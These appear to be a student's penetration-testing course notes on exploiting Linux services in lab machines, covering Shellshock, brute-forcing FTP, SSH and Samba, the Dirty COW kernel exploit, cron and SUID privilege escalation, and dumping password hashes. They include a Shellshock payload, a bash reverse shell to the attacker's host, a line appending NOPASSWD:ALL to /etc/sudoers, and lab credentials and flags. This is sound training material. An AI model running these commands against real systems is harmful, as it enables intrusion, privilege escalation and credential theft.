
## Frequently Exploited Linux Services 

Frequently Exploited Linux Services

- Linux is a free and open source operating system that is comprised of the Linux kernel, which was developed by Linus Torvalds, and the GNU toolkit, which is a collection of software and utilities that was started and developed by Richard Stallman.
- This combination of open source software is what makes up the Linux OS as a whole, and it is commonly referred to as GNU/Linux.
- Linux has various use cases, however, it is typically deployed as a server operating system. For this reason, there are specific services and protocols that will typically be found running on a Linux server. 
- These services provide an attacker with an access vector that they can utilize to gain access to a target host. 
- Having a good understanding of what these services are, how they work and their potential vulnerabilities is a vitally important skill to have as a penetration tester
  
![[Pasted image 20230706231607.png]]


## Exploiting Bash CVE-2014-6271 Vulnerability (Shellshock) 

CVE-2014-6271 - Shellshock:

- Shellshock (CVE-2014-6271) is a family of vulnerabilities in the Bash shell (since V1.3) that allows an attacker to execute remote arbitrary commands via Bash, leading to potential remote access to the target system via a reverse shell.
- The Shellshock vulnerability was discovered by Stéphane Chazelas on September 12, 2014, and publicly disclosed on September 24, 2014.
- Bash is a \*Nix shell that is part of the GNU project and serves as the default shell for most Linux distributions.
- The Shellshock vulnerability occurs due to a flaw in Bash, where Bash mistakenly executes trailing commands after a series of characters: "() {:;};"
	- als deze characters in bash worden ingevoerd dan wordt alles erna ook excuted door bash. 
- This vulnerability specifically affects Linux systems, as Windows does not use Bash since it is not a \Nix-based operating system.
- In the context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack.
- CGI (Common Gateway Interface) scripts are utilized by Apache to execute arbitrary commands on the Linux system, with the output being displayed to the client

Shellshock Exploration: 

- To exploit the Shellshock vulnerability, you need to identify an input vector or script that allows communication with Bash.
- In the case of an Apache web server, you can leverage any legitimate CGI scripts that are accessible on the server.
- When a CGI script is executed, the web server starts a new process and runs the script using Bash.
- The Shellshock vulnerability can be exploited manually by crafting specific payloads or automatically using an MSF exploit module.


-- Demo --- 
 
- perform service detection scan on target to confirm apache running 
- visit the ip in browser 
	- identify CGI script on webpage (look at page source) ![[Pasted image 20230710132143.png]]
	 the cgi script is passing commands in bash you can use this as input vector but before that you need to check if this system is vulnerable to shellshock explotation -> check in nmap 
- Check if system is vulnerable to shellshock: nmap -sV ip --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 
	- `--script=http-shellshock`: This option specifies that you want to use the `http-shellshock` script. Shellshock is a vulnerability in the Bash shell that allows remote code execution. The script is designed to detect if the target web server is vulnerable to this specific vulnerability.
	- `--script-args "http-shellshock.uri=/gettime.cgi"`: This argument provides additional parameters to the `http-shellshock` script. In this case, it sets the URI (Uniform Resource Identifier) to `/gettime.cgi`, which is the path of a specific CGI script on the target server. This allows the script to test the vulnerability specifically on that CGI script.
	- go to the browser and visit targetip/cgi link - configure Mozilla with foxyproxy - select Burp so all the traffic is redirected to Burp ![[Pasted image 20230710133011.png]]
- Open up Burb: 
	- go to proxy and make sure intercept is on 
	- make get request to cgi script in browser 
	- send incoming get request in burp to repeater 
		- in repeater get rid of user-agent and replace them with own characters: () {   :;    } ; echo;   echo;  /bin/bash -c 'cat   /etc/passwd'![[Pasted image 20230710133404.png]] ![[Pasted image 20230710133525.png]]
- gain a reverse shell on the target system 
	- set up a listener with netcat: nc -nvlp 1234 
	- open in burp: 'bash -i>&/dev/tcp/your-kali-ip/port-listner 0>&1' ![[Pasted image 20230710141925.png]]
		- - `bash -i`: This starts an interactive Bash shell with the `-i` option, allowing for interactive input/output. the main difference between interactive (`-i`) and non-interactive modes in Bash is the level of interactivity and the availability of certain features within the shell session. Interactive mode provides a more interactive and dynamic shell environment, while non-interactive mode is typically used for running scripts or commands that don't require user interaction.
		- `>&/dev/tcp/your-kali-ip/port-listener`: This redirects both the standard output and standard error streams to a TCP connection established with the specified IP address and port. You need to replace `your-kali-ip` with the actual IP address of your Kali machine, and `port-listener` with the desired port number for the listener.
		- `0>&1`: This redirects the standard input (file descriptor 0) to the standard output (file descriptor 1). `, it means we are redirecting the input of the command to the same place where the output is going.
	- Now you have a reverse shell
		- Run whoami 
		- cat /etc/\*issue 
		- uname -a 

How do we exploit this vulnerability in metasploit? 
- msfconsole 
- search shellshock 
	- we have aux module and exploit module 
	- use exploit and specify the options including path to cgi script 
	- you have meterpreter session 
		- sysinfo s
		- elevate privilege's 


-- Lab -- 

![[Pasted image 20230714152603.png]]
![[Pasted image 20230714152800.png]]












## Exploiting FTP 

- FTP (File Transfer Protocol) is a protocol that utilizes TCP port 21 and enables file sharing between a server and client/clients.
    - It is commonly used for transferring files to and from the directory of a web server.
- FTP authentication requires a username and password combination, making it possible to perform a brute-force attack on the FTP server to discover valid credentials.
- In certain cases, FTP servers may be configured to allow anonymous access, granting unrestricted access to the FTP server without requiring any legitimate credentials.
	- anonymous access: login without credentials 


--- demo - --

- perform nmap service scan 
- check if anonymous access is configured: 
	- ftp ip 
	- name: anonymous password: anonymous
	- when login failed anonymous login is not enabled 
- check is anonymous access if possible via nmap script 
	- command to search only for nmap script for ftp: ls -al /usr/share/nmap/script/ | grep ftp-* 
- bruteforce ftp: 
	- **hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt targetip -t 4 ftp** 
		- This option specifies the number of parallel tasks to be executed simultaneously. In this case, it is set to 4, meaning that Hydra will attempt to crack passwords using four parallel connections
	- start ftp and use username and password found in bruteforce attack 
	
	other option is to run searchsploit query on version of ftp found in nmap scan 
		- searchsploit allows you to search for exploits in exploit DB database 
			- exploit ProFTPD 
			

--- Lab ---- 


1. What is the version of FTP server?
   
   PORT   STATE SERVICE VERSION
	21/tcp open  ftp     ProFTPD 1.3.5a
   ![[Pasted image 20230717133020.png]]
   
2. Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt to check if any of these credentials work on the system. List all found credentials.
   
   ![[Pasted image 20230717133411.png]]
   [21][ftp] host: 192.66.3.3   login: sysadmin   password: 654321
[21][ftp] host: 192.66.3.3   login: rooty   password: qwerty
[21][ftp] host: 192.66.3.3   login: demo   password: butterfly
[STATUS] 3045.00 tries/min, 3045 tries in 00:01h, 4018 to do in 00:02h, 4 active
[21][ftp] host: 192.66.3.3   login: auditor   password: chocolate
[21][ftp] host: 192.66.3.3   login: anon   password: purple
[STATUS] 2549.50 tries/min, 5099 tries in 00:02h, 1964 to do in 00:01h, 4 active
[21][ftp] host: 192.66.3.3   login: administrator   password: tweety
[21][ftp] host: 192.66.3.3   login: diag   password: tigger
   
   
3. Find the password of user “sysadmin” using nmap script.
   
   first store the user in a file: echo "sysadmin" > users
than run the following command: 
nmap -p 21 --script ftp-brute --script-args userdb=/root/users 192.66.3.3 

![[Pasted image 20230717134954.png]]
sysadmin:654321  
   
4. Find seven flags hidden on the server.

 get {filename}








## Exploiting SSH 

- SSH (Secure Shell) is a remote administration protocol that provides encryption and serves as the successor to Telnet.
- It is commonly used for remote access to servers and systems.
- SSH uses TCP port 22 as its default port, although it can be configured to use other open TCP ports.
- SSH authentication can be configured in two ways:
    - Username and password authentication
    - Key-based authentication
- In the case of username and password authentication, a brute-force attack can be attempted on the SSH server to discover valid credentials and gain access to the target system.


-- demo -- 
- perform nmap service scan 
- perform bruteforce attack: 
	- hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt targetip -t 4 ssh 
	- use credentials to try to log into target system: ssh username@ip 
		- groups user: see if it is part of sudo group 
		- cat /etc/\*issue to see version 
		- uname -r 
		- cat /etc/passwd 
	- find the flag 


-- Lab -- 

- auxiliary/scanner/ssh/ssh_version
- auxiliary/scanner/ssh/ssh_login 

22/tcp open  ssh     OpenSSH 7.9p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0) 

root@attackdefense:~# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.9.96.3 -t 4 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.


[DATA] max 4 tasks per 1 server, overall 4 tasks, 350 login tries (l:7/p:50), ~88 tries per task
[DATA] attacking ssh://192.9.96.3:22/
[22][ssh] host: 192.9.96.3   login: sysadmin   password: hailey
[STATUS] 74.00 tries/min, 74 tries in 00:01h, 276 to do in 00:04h, 4 active
[22][ssh] host: 192.9.96.3   login: rooty   password: pineapple
[22][ssh] host: 192.9.96.3   login: demo   password: butterfly1
[22][ssh] host: 192.9.96.3   login: auditor   password: xbox360
[STATUS] 69.33 tries/min, 208 tries in 00:03h, 142 to do in 00:03h, 4 active
[STATUS] 60.75 tries/min, 243 tries in 00:04h, 107 to do in 00:02h, 4 active
[22][ssh] host: 192.9.96.3   login: anon   password: 741852963
[STATUS] 54.80 tries/min, 274 tries in 00:05h, 76 to do in 00:02h, 4 active

[STATUS] 49.00 tries/min, 294 tries in 00:06h, 56 to do in 00:02h, 4 active
[22][ssh] host: 192.9.96.3   login: administrator   password: password1
[STATUS] 46.86 tries/min, 328 tries in 00:07h, 22 to do in 00:01h, 4 active
[22][ssh] host: 192.9.96.3   login: diag   password: secret

![[Pasted image 20230717141806.png]]


- Use **/usr/share/metasploit-framework/data/wordlists/common_users.txt** username dictionary
- Use **/usr/share/metasploit-framework/data/wordlists/common_passwords.txt** password dictionary

![[Pasted image 20230717145859.png]]

metasploit zet meteen een ssh session op, 





## Exploiting SAMBA 

SMB (Server Message Block):

- SMB is a network file sharing protocol used for sharing files and peripherals between computers on a local network (LAN).
- The default port for SMB is 445 (TCP). However, it originally ran on top of NetBIOS using port 139.
- Samba is the Linux implementation of SMB, enabling Windows systems to access Linux shares and devices. Not prepacked 

Exploiting SAMBA:

- SAMBA utilizes username and password authentication for accessing servers or network shares.
- A brute-force attack can be performed on the SAMBA server to obtain legitimate credentials.
- Once legitimate credentials are obtained, the SMBMap utility can be used to enumerate SAMBA share drives, list share contents, download files, and execute remote commands on the target.
- Another tool called smbclient, part of the SAMBA software suite, provides a client interface similar to FTP. It allows downloading files from the server to the local machine, uploading files from the local machine to the server, and retrieving directory information from the server

Demo enumerating shares 
- run nmap service scan 
- perform bruteforce on smb 
- hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt targetip smb 
	- we don't use a wordlist or username because we know which account/username we want to bruteforce 
- smbmap 
	- enumerate shares on target system: smbmap -H targetip -u admin -p password1 
	- access the found shares through smbclient
		- is the share browseable: smbclient -L ip -U admin 
			- If the share is browseable, you will see a list of available shares on the specified server.
		- smbclient //ip/Sharename -U admin 
			- get flag - exit 
			- ls our directory 
			- tar xzf file (to extract the content)
- enum for linux 
	- enum4linux -a target 
	- enum4linux -a -u admin -p password1 target 
	

--- Lab 0000 


139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)


- What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt


192.89.93.3:445 - Success: '.\jane:**abc123'**


- What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt


root@attackdefense:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz 192.89.93.3 smb
Hydritary or secret service organizations, or for illegal purposes.
a v8.8 (c) 2019 by van Hauser/THC - Please do not use in mil
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-17 13:14:42
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://192.89.93.3:445/
[445][smb] host: 192.89.93.3   login: admin   password: **password1**
  
- Which share is read only? Use smbmap with credentials obtained in question 2. nancy is read only 
  
  ![[Pasted image 20230717153817.png]]
  
  
- Is share “jane” browseable? Use credentials obtained from the 1st question.

root@attackdefense:~# smbclient -L 192.89.93.3 -U jane
Enter WORKGROUP\jane's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        shawn           Disk      
        nancy           Disk      
        admin           Disk      
        IPC$            IPC       IPC Service (brute.samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            

  
- Fetch the flag from share “admin”
![[Pasted image 20230717155242.png]]

2727069bc058053bd561ce372721c92e


- List the named pipes available over SMB on the samba server? Use  pipe_auditor metasploit module with credentials obtained from question 2.


![[Pasted image 20230717154754.png]]

  
- List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling  using enum4Linux with credentials obtained in question 2 


S-1-22-1-1000 Unix User\shawn (Local User)
S-1-22-1-1001 Unix User\jane (Local User)
S-1-22-1-1002 Unix User\nancy (Local User) 







## Linux Kernel Exploitation 

Kernel Exploits on Linux:

- Kernel exploits on Linux target vulnerabilities in the Linux kernel to execute arbitrary code, enabling the execution of privileged system commands or obtaining a system shell.
- The process for exploiting kernel vulnerabilities will vary based on the targeted kernel version, distribution, and the specific kernel exploit being utilized.
- Privilege escalation on Linux systems typically follows this methodology:
    - Identifying kernel vulnerabilities
    - Downloading, compiling, and transferring kernel exploits to the target system

Tools & Environment:

- Linux-Exploit-Suggester: This tool helps detect security deficiencies in a given Linux kernel or Linux-based machine. It utilizes heuristics methods to assess the exposure of the kernel to publicly known Linux kernel exploits.
    - GitHub: [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- Note: The techniques demonstrated in this video are performed on an Ubuntu 12.04 VM.
- be carefull with kernel exploits because it can cause kernel panic and dataloss 

-- Demo -- 

Set up meterpreter session:
	- sysinfo 
	- getuid 
	- obtain a bash sessin: 
		- shell 
		- cat /etc/passwd 
		- sudo apt-get update 
	- obtain root privileges 
		- download LES on kali and then transferring it over to target 
		- in meterpreter session cd /tmp and ls 
		- upload ~/Desktop/Linux-Enum/les.sh 
		- shell 
		- /bin/bash -i 
		- chmod +x les.sh 
		- ls - alps 
		- ./les.sh (this will execute the script)
verify exploit code to ensure that it is not doing anything malicious 

![[Pasted image 20230712152115.png]]
download ![[Pasted image 20230712152149.png]]
to run C you need to install package: sudo apt-get install gcc 
![[Pasted image 20230712175057.png]]
- navigate to the exploit file on your kali 
- rename the file to dirty.c: mv filename dirty.c 
- run gcc command (see exploit-db for command to compile)
- terminate channel 

- go back to meterpreter
	- upload ~/Downloads/dirty 
	- open een shell session 
	- bin bash -i 
	- chmod +x dirty 
	- ./dirty password123
	- when it is not compiled on the system you will get error messages 
	- remove the dirty file (rm) and go back to meterpreter session 
		- upload ~/Download/dirty.c 
		- /bin/bash -i (open shell)
		- run gcc command
		- chmod +x dirty
		- ./dirty password123 
		- 


FILMPJE VERDER KIJKEN 

			  
a backup of etc password file will be created 
you can login with firefart (created and has priviliges)
- su firefart (switch user)
- Delete ssh key if you get an error 
- connect over ssh with firefart 
- apt-get update 
- cat /etc/shadow 









## Exploiting Misconfigured Cron Jobs 

Cron Jobs:

- Linux utilizes a utility called Cron for task scheduling.
- Cron is a time-based service that runs applications, scripts, and other commands on a specified schedule.
- A recurring task configured with Cron is called a Cron job. It enables automation and repetition of various functions on a system, such as backups, upgrades, and patches.
	- An application or script that has been configured to be run repeatedly with Cron is known as a Cron job. Cron can be used to automate or repeat a wide variety of functions on a system, from daily backups to system upgrades and patches. 
- The **crontab** file is the configuration file used by Cron to store and manage created Cron jobs. 

Exploiting Misconfigured Cron Jobs:

- Cron jobs can be executed by any user on the system. It is crucial to monitor Cron jobs that have been set up to run as the "root" user.
- When a Cron job is run as the root user, any script or command executed by that job also runs with root privileges, potentially granting full administrative access.
- To escalate privileges, it is necessary to identify Cron jobs scheduled by the root user or investigate the files being processed by those Cron jobs.

--- Demo --- 

following compiler can be used to compile exploit code written in C: GCC

voorwerk 
- Whoami 
- groups  user -> groups student 
- cat /etc/passwd 

identify cron jobs to gain sudo permissions 
- crontab -l 
- list content of user home directory ~: **ls -al**  
- when you see a file that is owned by root account: try to identify where the file is stored using a grep utility 
	- grep -rnw /user -e "/home/student/message" 
		    - `-r` (or `--recursive`): This option tells `grep` to search recursively in all subdirectories of the specified directory.
		    - `-n` (or `--line-number`): This option prints the line numbers along with the matched lines.
		    - `-w` (or `--word-regexp`): This option ensures that only whole words are matched. It prevents partial matches.
		-  `/usr`: This is the directory where the search will start. In this case, it's the root directory `/usr`, which is a common location for system files in Unix-like systems 		    
		- `-e`: This option is used to specify the pattern or string to search for. In this case, the pattern being searched for is `"/home/student/message"`.
		- The command will search for the pattern `"/home/student/message"` within files in the `/usr` directory and its subdirectories. It will display the matching lines along with their line numbers. 
		  ![[Pasted image 20230718084352.png]]
	- The grep search will give the path /file \ location where it is copied \ destination 
		- list out the destination where the file is copies to (cat)
		- you cant continue... 
![[Pasted image 20230712194734.png]]
- ls -al /usr/local/share/copy.sh (list out the permissions of the shell script) 
  
- can we add a line of code in the shell script to have the cronjob execute it
	- cat the shell script to see what it does 	  
	- run: *printf '#!/bin/bash\\\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh* 
		- `printf`: It is a command used to format and print text. In this case, it is used to generate the content of the `copy.sh` file.
		- `#!/bin/bash`: This is the shebang line, which indicates the interpreter to be used to execute the script. It specifies that the script should be interpreted by the Bash shell (`/bin/bash`).
		- `\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers`: This is the content that will be written to the `copy.sh` file. It consists of a newline character (`\n`) followed by the command `echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers`. This command appends the line `"student ALL=NOPASSWD:ALL"` to the `/etc/sudoers` file.
			- the appended line grants the user "student" the ability to run any command with `sudo` without being prompted for a password on any host.
		- `> /usr/local/share/copy.sh`: This redirects the output of the `printf` command, which generates the script's content, and writes it to the file `/usr/local/share/copy.sh`. which is the script that is executed by the cronjob. The `>` operator is used for output redirection and creates or overwrites the file if it already exists.
			- `> /usr/local/share/copy.sh`: This redirects the output of the `printf` command, which generates the script's content, and writes it to the file `/usr/local/share/copy.sh`. The `>` operator is used for output redirection and creates or overwrites the file if it already exists.
![[Pasted image 20230713113250.png]]

- wait a minute for the cronjob to run; and check all the users that are part of te sudo group: sudo -l 
- sudo su  (elevate privileges to root)
- whoami 
- crontab -l  ( to display the list of scheduled cron jobs for the current user)

In een notendop: 
1. identify the files or scripts that are used by cronjobs 
2. identify whether that script can be modified by unprivileged user. 
3. modified the script where we added a command that adds the unprivileged user to the sudoers file 


--- Lab ---- 

*Your mission is to get a root shell on the box and retrieve the flag!*

student@attackdefense:/$ grep -rnw /usr -e "/home/student/message"
/usr/local/share/copy.sh:2:cp /home/student/message /tmp/message 

student@attackdefense:/$
student@attackdefense:/$ sudo -l
Matching Defaults entries for student on attackdefense:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User student may run the following commands on attackdefense:
    (root) NOPASSWD: /etc/init.d/cron
    (root) NOPASSWD: ALL
    (root) NOPASSWD: ALL
student@attackdefense:/$ whoami
student
student@attackdefense:/$ crontab -l
no crontab for student
student@attackdefense:/$ sudo su
root@attackdefense:/# whoami
root
root@attackdefense:/# crontab -l
*/01 * * * * sh /usr/l 

root@attackdefense:/# sudo bin/bash
root@attackdefense:/# cd tmp
root@attackdefense:/tmp# ls -a
.  ..  message
root@attackdefense:/tmp# cat message
Hey!! you are not root :(
root@attackdefense:/tmp# sudo cat message
Hey!! you are not root :(
root@attackdefense:/tmp# cd /root/
root@attackdefense:~# ls -a
.  ..  .bashrc  .profile  flag
root@attackdefense:~# cat flag
697914df7a07bb9b718c8ed258150164
root@attackdefense:~#















## Exploiting SUID Binaries 

SUID (Set Owner User ID) Permissions:

- In addition to the main file access permissions (read, write, and execute), Linux provides specialized permissions for specific situations. One of these permissions is the SUID permission.
- When applied, the SUID permission allows users to execute a script or binary with the permissions of the file owner, rather than the user running the script or binary.
- SUID permissions are commonly used to allow unprivileged users to run specific scripts or binaries with "root" permissions. However, it's important to note that this privilege is limited to the execution of the script and does not grant overall privilege elevation. Improperly configured SUID binaries can be exploited by unprivileged users to gain elevated access through misconfigurations or vulnerabilities within the binary or script.

- The goal is to exploit the SUID functionality to elevate privileges. The success of the attack depends on the following factors:
    - Owner of the SUID binary: We target SUID binaries owned by the "root" user or other privileged users to achieve privilege escalation.
    - Access permissions: Executable permissions are required to execute the SUID binary and exploit its functionality.

-- Demo -- 

- pwd 
- ls -al (list out all the directories) look at the rights for each dir 
- find a dir that gives us executable rights but it owned by root 
 ![[Pasted image 20230713120115.png]]
- the s permission implies that that the SUID is applied here = executable with root privileges  
- execute binary: ./welcome
- perform static analysis on file 
	- file welcome (see more information about the binary)
	- strings welcome (list of string within the binary)
	- find something to use 
- rm greetings 
- create own greetings binary: cp /bin/bash greetings 
	- ![[Pasted image 20230713124512.png]]


--- Lab --- 

**Your mission:**
1. Get as root shell on the system
2. View /etc/shadow
3. Retrieve the flag





























## Dumping Linux Password Hashes 

Multi-User Support in Linux:
- Linux supports multiple users, allowing simultaneous access to the system. This offers both advantages and disadvantages from a security perspective. Multiple accounts provide multiple access vectors for attackers, increasing the overall risk of the server.

User Account Information:
- User account information for Linux is stored in the `/etc/passwd` file.
- Passwords in the passwd file are encrypted, making them unreadable by users on the system.
- Encrypted passwords for users are stored in the `/etc/shadow` file, which can only be accessed and read by the root account. This is a crucial security feature that prevents other accounts from accessing the hashed passwords.

Linux Password Hashes:
- The passwd file provides information about the hashing algorithm used and the password hash. This information helps determine the type and strength of the hashing algorithm.
- The type of hashing algorithm can be determined by looking at the number after the username encapsulated by the dollar symbol (`$`).

![[Pasted image 20230706232136.png]]
5 and 6 are harder to crack 

-- demo -- 
-  searchsploit for ftp version 
- start msfconsole and search exploit module (search proftpd)
	- use backdoor module 
	- /bin/bash -i  (to obtain bash session)
	- id 
	- cnt + Z to put this session in the background 
		- sessions 
		- sessions -u 1 (upgrade session 1 to meterpreter session)
		- sessions 
		- session 2 
		- sysinfo 
		- getuid  (uid=0 -> root user )
		- cat /etc/shadow (dump hashes)
			- put this in the background
			  
Andere manier is met hashdump module 
- post/linux.gather/hashdump module 
- set session 2 (meterpreter session) 
- give you hashed passwords and save them in a txt for you 
- ... 




